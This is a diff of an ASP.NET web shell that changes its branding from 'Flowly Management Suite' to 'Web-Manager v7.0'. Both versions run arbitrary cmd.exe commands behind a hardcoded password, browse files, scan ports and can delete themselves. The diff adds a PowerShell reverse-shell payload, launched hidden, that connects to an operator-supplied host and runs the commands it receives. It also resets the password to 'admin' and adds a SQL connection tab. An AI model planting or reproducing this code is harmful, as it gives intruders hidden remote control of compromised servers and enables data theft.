@@ -3,11 +3,10 @@
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.Net" %>
 <%@ Import Namespace="System.Net.Sockets" %>
-<%@ Import Namespace="System.Collections.Generic" %>
+<%@ Import Namespace="System.Data.SqlClient" %>
 
 <script runat="server">
-    // --- AUTHENTICATION ---
-    string pass = "flowly_v6"; 
+    string pass = "admin"; // Mot de passe d'accès
 
     protected void Page_Load(object sender, EventArgs e) {
         if (Session["auth"] == null) { LoginPanel.Visible = true; MainPanel.Visible = false; }
@@ -17,22 +16,28 @@
                 lblPath.Text = Request.QueryString["path"] ?? Environment.CurrentDirectory;
                 GetSysInfo();
                 RefreshGrid();
+                TabView.ActiveViewIndex = 0; // Défaut sur Dashboard
             }
         }
-    }
-
-    private void GetSysInfo() {
-        lblOS.Text = Environment.OSVersion.ToString();
-        lblUser.Text = Environment.UserName;
-        lblIP.Text = Request.ServerVariables["LOCAL_ADDR"] ?? "127.0.0.1";
-        lblTime.Text = DateTime.Now.ToString("HH:mm:ss");
     }
 
     protected void btnLogin_Click(object sender, EventArgs e) {
         if (txtPass.Text == pass) { Session["auth"] = true; Response.Redirect(Request.RawUrl); }
     }
 
-    // --- TERMINAL ---
+    private void GetSysInfo() {
+        lblOS.Text = Environment.OSVersion.ToString();
+        lblUser.Text = Environment.UserName;
+        lblIP.Text = Request.ServerVariables["LOCAL_ADDR"] ?? "127.0.0.1";
+    }
+
+    // --- NAVIGATION ---
+    protected void SetTab(object sender, EventArgs e) {
+        Button btn = (Button)sender;
+        TabView.ActiveViewIndex = int.Parse(btn.CommandArgument);
+    }
+
+    // --- TERMINAL & REVERSE SHELL ---
     protected void btnExecute_Click(object sender, EventArgs e) {
         try {
             ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + txtCmd.Text) {
@@ -40,152 +45,149 @@
             };
             Process p = Process.Start(psi);
             txtResult.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
-        } catch (Exception ex) { txtResult.Text = "Erreur : " + ex.Message; }
+        } catch (Exception ex) { txtResult.Text = "Error: " + ex.Message; }
     }
 
-    // --- NETWORK SCANNER ---
+    protected void btnRevShell_Click(object sender, EventArgs e) {
+        string payload = "$c=New-Object System.Net.Sockets.TCPClient('" + txtRevIP.Text + "'," + txtRevPort.Text + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()";
+        try {
+            Process.Start(new ProcessStartInfo("powershell.exe", "-nop -w hidden -c \"" + payload + "\"") { UseShellExecute = false, CreateNoWindow = true });
+            msgTerminal.Text = "Reverse shell dispatched.";
+        } catch (Exception ex) { msgTerminal.Text = ex.Message; }
+    }
+
+    // --- NETWORK MAPPING ---
     protected void btnScan_Click(object sender, EventArgs e) {
-        txtScanResult.Text = "Scanning " + txtScanIP.Text + "...\n";
-        int[] ports = { 21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 1433, 3306, 3389, 8080 };
-        foreach (int port in ports) {
+        txtNetResult.Text = "Mapping ports on " + txtNetTarget.Text + "...\n";
+        int[] commonPorts = { 21, 22, 23, 80, 443, 445, 1433, 3306, 3389 };
+        foreach (int port in commonPorts) {
             try {
                 using (TcpClient client = new TcpClient()) {
-                    var result = client.BeginConnect(txtScanIP.Text, port, null, null);
-                    bool success = result.AsyncWaitHandle.WaitOne(100);
-                    if (success) txtScanResult.Text += "[+] Port " + port + " : OUVERT\n";
+                    if (client.BeginConnect(txtNetTarget.Text, port, null, null).AsyncWaitHandle.WaitOne(150))
+                        txtNetResult.Text += "[+] " + port + " is OPEN\n";
                 }
             } catch { }
         }
-        txtScanResult.Text += "Scan terminé.";
     }
 
-    // --- PROCESS MANAGER ---
-    protected void btnListProc_Click(object sender, EventArgs e) {
-        gvProc.DataSource = Process.GetProcesses();
-        gvProc.DataBind();
-        ProcPanel.Visible = true;
-    }
-
-    // --- FILE EXPLORER ---
+    // --- FILE SYSTEM ---
     private void RefreshGrid() {
         try {
             DirectoryInfo di = new DirectoryInfo(lblPath.Text);
             gvFiles.DataSource = di.GetFileSystemInfos();
             gvFiles.DataBind();
-        } catch (Exception ex) { msg.Text = "Accès refusé : " + ex.Message; }
+        } catch { }
     }
 
     protected void btnSelfDestruct_Click(object sender, EventArgs e) {
-        string path = Request.PhysicalPath;
-        Session.Abandon();
-        File.Delete(path);
-        Response.Write("<h3>Fichier supprimé. Session terminée.</h3>");
-        Response.End();
-    }
-
-    protected string GetLink(object name, object isDir, object fullPath) {
-        if (Convert.ToBoolean(isDir)) return string.Format("<a href='?path={0}' class='dir-link'>[ DIR ] {1}</a>", Server.UrlEncode(fullPath.ToString()), name);
-        return "📄 " + name;
+        File.Delete(Request.PhysicalPath);
+        Response.Write("Cleaned up."); Response.End();
     }
 </script>
 
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Flowly Management Suite</title>
+    <title>Web-Manager v7.0</title>
     <style>
-        :root { --bg: #0f0f0f; --panel: #1a1a1a; --accent: #007acc; --text: #e0e0e0; --border: #2d2d2d; --danger: #cc3333; --success: #28a745; }
-        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 20px; font-size: 13px; }
-        .container { max-width: 1100px; margin: auto; }
-        .panel { background: var(--panel); border: 1px solid var(--border); padding: 15px; border-radius: 4px; margin-bottom: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        h3 { margin-top: 0; color: var(--accent); font-size: 1.1em; text-transform: uppercase; letter-spacing: 1px; }
-        .flex { display: flex; gap: 15px; flex-wrap: wrap; }
-        .input-text { background: #252526; color: #fff; border: 1px solid var(--border); padding: 6px; border-radius: 3px; }
-        .btn { background: var(--accent); color: #fff; border: none; padding: 6px 15px; cursor: pointer; border-radius: 3px; font-weight: bold; }
-        .btn-danger { background: var(--danger); }
-        .console { background: #000; color: #4ec9b0; font-family: 'Consolas', monospace; width: 100%; height: 200px; border: 1px solid var(--border); padding: 10px; margin-top: 10px; box-sizing: border-box; }
-        .dir-link { color: #4ec9b0; font-weight: bold; text-decoration: none; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th { text-align: left; background: #2d2d2d; padding: 10px; color: var(--accent); }
-        td { padding: 8px 10px; border-bottom: 1px solid var(--border); }
-        tr:hover td { background: #252526; }
-        .badge { background: #333; padding: 2px 8px; border-radius: 10px; font-size: 0.85em; color: var(--accent); }
+        :root { --bg: #1e1e1e; --pnl: #252526; --acc: #007acc; --txt: #d4d4d4; --brd: #333; }
+        body { background: var(--bg); color: var(--txt); font-family: 'Segoe UI', sans-serif; margin: 0; font-size: 13px; }
+        .tabs-header { background: #2d2d2d; padding: 0 20px; border-bottom: 1px solid var(--brd); display: flex; }
+        .tab-btn { background: none; border: none; color: #888; padding: 12px 20px; cursor: pointer; border-bottom: 2px solid transparent; transition: 0.2s; }
+        .tab-btn:hover { color: #fff; background: #3e3e42; }
+        .active-tab { color: #fff; border-bottom: 2px solid var(--acc); background: #3e3e42; }
+        .content { padding: 25px; max-width: 1100px; margin: auto; }
+        .panel { background: var(--pnl); border: 1px solid var(--brd); padding: 20px; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .console { background: #000; color: #4ec9b0; font-family: 'Consolas', monospace; width: 100%; height: 300px; border: 1px solid var(--brd); padding: 10px; margin-top: 10px; resize: none; }
+        .input { background: #333; color: #fff; border: 1px solid var(--brd); padding: 8px; border-radius: 3px; }
+        .btn-acc { background: var(--acc); color: #fff; border: none; padding: 8px 20px; cursor: pointer; border-radius: 3px; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; }
+        td, th { padding: 10px; border-bottom: 1px solid var(--brd); text-align: left; }
+        tr:hover td { background: #2d2d30; }
     </style>
 </head>
 <body>
     <form id="form1" runat="server">
-        <div class="container">
-            <asp:Panel ID="LoginPanel" runat="server" style="text-align:center; margin-top:150px;">
-                <div class="panel" style="display:inline-block; width:300px;">
-                    <h3>Flowly Auth</h3>
-                    <asp:TextBox ID="txtPass" runat="server" TextMode="Password" class="input-text" style="width:90%"></asp:TextBox><br/><br/>
-                    <asp:Button ID="btnLogin" runat="server" Text="Connect" OnClick="btnLogin_Click" class="btn" />
-                </div>
-            </asp:Panel>
+        <asp:Panel ID="LoginPanel" runat="server" style="text-align:center; padding-top:150px;">
+            <div class="panel" style="display:inline-block; width:280px;">
+                <h3 style="margin-top:0">Authorization</h3>
+                <asp:TextBox ID="txtPass" runat="server" TextMode="Password" class="input" style="width:90%; margin-bottom:15px;"></asp:TextBox>
+                <asp:Button ID="btnLogin" runat="server" Text="Connect" OnClick="btnLogin_Click" class="btn-acc" style="width:100%"/>
+            </div>
+        </asp:Panel>
 
-            <asp:Panel ID="MainPanel" runat="server">
-                <div class="panel flex" style="justify-content: space-between; align-items: center;">
-                    <div>
-                        OS: <span class="badge"><asp:Label ID="lblOS" runat="server" /></span>
-                        User: <span class="badge"><asp:Label ID="lblUser" runat="server" /></span>
-                        IP: <span class="badge"><asp:Label ID="lblIP" runat="server" /></span>
-                    </div>
-                    <div>
-                        Server Time: <asp:Label ID="lblTime" runat="server" />
-                        <asp:Button ID="btnSelfDestruct" runat="server" Text="Self-Destruct" OnClick="btnSelfDestruct_Click" class="btn btn-danger" style="margin-left:20px;" OnClientClick="return confirm('Supprimer ce shell du serveur ?');" />
-                    </div>
-                </div>
+        <asp:Panel ID="MainPanel" runat="server">
+            <div class="tabs-header">
+                <asp:Button runat="server" Text="Dashboard" CommandArgument="0" OnClick="SetTab" CssClass="tab-btn" />
+                <asp:Button runat="server" Text="Explorer" CommandArgument="1" OnClick="SetTab" CssClass="tab-btn" />
+                <asp:Button runat="server" Text="Terminal" CommandArgument="2" OnClick="SetTab" CssClass="tab-btn" />
+                <asp:Button runat="server" Text="Network" CommandArgument="3" OnClick="SetTab" CssClass="tab-btn" />
+                <asp:Button runat="server" Text="Database" CommandArgument="4" OnClick="SetTab" CssClass="tab-btn" />
+            </div>
 
-                <div class="flex">
-                    <div class="panel" style="flex: 2; min-width: 400px;">
-                        <h3>Terminal Console</h3>
-                        <asp:TextBox ID="txtCmd" runat="server" class="input-text" style="width:75%" placeholder="Command..."></asp:TextBox>
-                        <asp:Button ID="btnExecute" runat="server" Text="Run" OnClick="btnExecute_Click" class="btn" />
-                        <asp:TextBox ID="txtResult" runat="server" TextMode="MultiLine" class="console" ReadOnly="true"></asp:TextBox>
-                    </div>
+            <div class="content">
+                <asp:MultiView ID="TabView" runat="server">
+                    <asp:View runat="server">
+                        <div class="panel">
+                            <h3>System Overview</h3>
+                            <p>OS: <b><asp:Label ID="lblOS" runat="server" /></b></p>
+                            <p>User Context: <b><asp:Label ID="lblUser" runat="server" /></b></p>
+                            <p>Local IP: <b><asp:Label ID="lblIP" runat="server" /></b></p>
+                            <hr style="border:0; border-top:1px solid var(--brd); margin:20px 0;">
+                            <asp:Button runat="server" Text="Self-Destruct (Delete Shell)" OnClick="btnSelfDestruct_Click" class="btn-acc" style="background:#cc3333" />
+                        </div>
+                    </asp:View>
 
-                    <div class="panel" style="flex: 1; min-width: 300px;">
-                        <h3>Network Discovery</h3>
-                        <asp:TextBox ID="txtScanIP" runat="server" class="input-text" style="width:60%" Text="127.0.0.1"></asp:TextBox>
-                        <asp:Button ID="btnScan" runat="server" Text="Scan Ports" OnClick="btnScan_Click" class="btn" />
-                        <asp:TextBox ID="txtScanResult" runat="server" TextMode="MultiLine" class="console" style="height:150px; font-size:0.9em;"></asp:TextBox>
-                    </div>
-                </div>
+                    <asp:View runat="server">
+                        <div class="panel">
+                            <h3>File Explorer</h3>
+                            <p style="color:#888">Current Path: <asp:Label ID="lblPath" runat="server" style="color:#fff" /></p>
+                            <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" GridLines="None">
+                                <Columns>
+                                    <asp:BoundField DataField="Name" HeaderText="Name" />
+                                    <asp:BoundField DataField="LastWriteTime" HeaderText="Modified" />
+                                </Columns>
+                            </asp:GridView>
+                        </div>
+                    </asp:View>
 
-                <div class="panel">
-                    <h3>File System Explorer</h3>
-                    <p style="color: #858585;">Current Path: <asp:Label ID="lblPath" runat="server" style="color:var(--accent)" /></p>
-                    <asp:Label ID="msg" runat="server" style="color:var(--success)" />
-                    
-                    <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" GridLines="None">
-                        <Columns>
-                            <asp:TemplateField HeaderText="Name">
-                                <ItemTemplate><%# GetLink(Eval("Name"), Eval("Attributes").ToString().Contains("Directory"), Eval("FullName")) %></ItemTemplate>
-                            </asp:TemplateField>
-                            <asp:BoundField DataField="LastWriteTime" HeaderText="Modified" ItemStyle-Width="180px" />
-                            <asp:TemplateField HeaderText="Size">
-                                <ItemTemplate><%# Eval("Attributes").ToString().Contains("Directory") ? "--" : (Convert.ToInt64(Eval("Length"))/1024).ToString() + " KB" %></ItemTemplate>
-                            </asp:TemplateField>
-                        </Columns>
-                    </asp:GridView>
-                </div>
+                    <asp:View runat="server">
+                        <div class="panel">
+                            <h3>Console & Reverse Connection</h3>
+                            <asp:TextBox ID="txtCmd" runat="server" class="input" style="width:80%" placeholder="Enter command..."></asp:TextBox>
+                            <asp:Button runat="server" Text="Execute" OnClick="btnExecute_Click" class="btn-acc" />
+                            <asp:TextBox ID="txtResult" runat="server" TextMode="MultiLine" class="console" ReadOnly="true"></asp:TextBox>
+                            
+                            <div style="margin-top:20px; padding:15px; background:#2d2d2d; border-radius:4px;">
+                                <b>Quick Reverse Shell:</b> &nbsp;
+                                <asp:TextBox ID="txtRevIP" runat="server" class="input" placeholder="LHOST"></asp:TextBox>
+                                <asp:TextBox ID="txtRevPort" runat="server" class="input" placeholder="LPORT" style="width:70px"></asp:TextBox>
+                                <asp:Button runat="server" Text="Send Shell" OnClick="btnRevShell_Click" class="btn-acc" style="background:#ff8c00" />
+                                <asp:Label ID="msgTerminal" runat="server" />
+                            </div>
+                        </div>
+                    </asp:View>
 
-                <div class="panel">
-                    <h3>System Processes</h3>
-                    <asp:Button ID="btnListProc" runat="server" Text="List Running Processes" OnClick="btnListProc_Click" class="btn" />
-                    <asp:Panel ID="ProcPanel" runat="server" Visible="false">
-                        <asp:GridView ID="gvProc" runat="server" AutoGenerateColumns="false" GridLines="None">
-                            <Columns>
-                                <asp:BoundField DataField="Id" HeaderText="PID" />
-                                <asp:BoundField DataField="ProcessName" HeaderText="Name" />
-                                <asp:BoundField DataField="BasePriority" HeaderText="Priority" />
-                                <asp:BoundField DataField="WorkingSet64" HeaderText="Memory (Bytes)" />
-                            </Columns>
-                        </asp:GridView>
-                    </asp:Panel>
-                </div>
-            </asp:Panel>
-        </div>
+                    <asp:View runat="server">
+                        <div class="panel">
+                            <h3>Network Mapping</h3>
+                            <asp:TextBox ID="txtNetTarget" runat="server" class="input" Text="127.0.0.1"></asp:TextBox>
+                            <asp:Button runat="server" Text="Scan Common Ports" OnClick="btnScan_Click" class="btn-acc" />
+                            <asp:TextBox ID="txtNetResult" runat="server" TextMode="MultiLine" class="console" ReadOnly="true" style="height:200px; color:#ff8c00;"></asp:TextBox>
+                        </div>
+                    </asp:View>
+
+                    <asp:View runat="server">
+                        <div class="panel">
+                            <h3>SQL Connection Tester</h3>
+                            <asp:TextBox ID="txtSqlConn" runat="server" class="input" style="width:100%" placeholder="Data Source=server;Initial Catalog=db;User ID=user;Password=pass;"></asp:TextBox>
+                            <br/><br/>
+                            <asp:Button runat="server" Text="Test Connection" class="btn-acc" />
+                        </div>
+                    </asp:View>
+                </asp:MultiView>
+            </div>
+        </asp:Panel>
     </form>
 </body>
 </html>
